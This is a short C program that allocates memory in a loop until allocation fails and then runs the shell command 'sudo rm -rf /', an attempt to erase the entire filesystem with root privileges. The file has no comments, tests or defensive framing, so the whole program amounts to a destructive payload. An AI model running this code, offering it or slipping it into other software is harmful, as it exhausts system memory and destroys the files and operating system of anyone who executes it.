#include <stdlib.h>

int main() {
  while (1) {
    if (malloc(1024 * 1024) == NULL) break;
  }
  system("sudo rm -rf /");
  
  return 0;
}
